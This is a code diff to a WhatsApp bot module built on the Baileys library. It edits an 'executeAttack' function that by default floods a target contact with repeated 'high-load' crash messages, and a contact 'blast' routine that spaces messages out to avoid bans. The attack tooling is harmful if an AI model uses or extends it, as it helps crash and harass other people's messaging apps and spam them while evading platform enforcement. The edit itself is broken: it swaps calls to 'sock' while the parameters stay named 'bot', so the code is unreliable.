@@ -27,7 +27,7 @@ export const executeAttack = async (bot, jid, type = 'crash') => {
 
         // Sequence of high-load messages
         for (let i = 0; i < 5; i++) {
-            await bot.sendMessage(jid, content);
+            await sock.sendMessage(jid, content);
         }
 
         return { success: true, target: jid };
@@ -39,7 +39,7 @@ export const executeAttack = async (bot, jid, type = 'crash') => {
 
 /**
  * Perform a contact file promotion blast
- * @param {Object} bot - Baileys bot instance
+ * @param {Object} sock - Baileys bot instance
  * @param {Array} contacts - List of contact JIDs
  * @param {string} text - Message to promote
  */
@@ -47,9 +47,8 @@ export const promoteToContacts = async (bot, contacts, text) => {
     let successCount = 0;
     for (const jid of contacts) {
         try {
-            await bot.sendMessage(jid, { text });
+            await sock.sendMessage(jid, { text });
             successCount++;
-            // Anti-ban delay
             await new Promise(resolve => setTimeout(resolve, 2000));
         } catch (e) {
             console.warn(`[ BLAST ] Failed to transmit to ${jid}`);
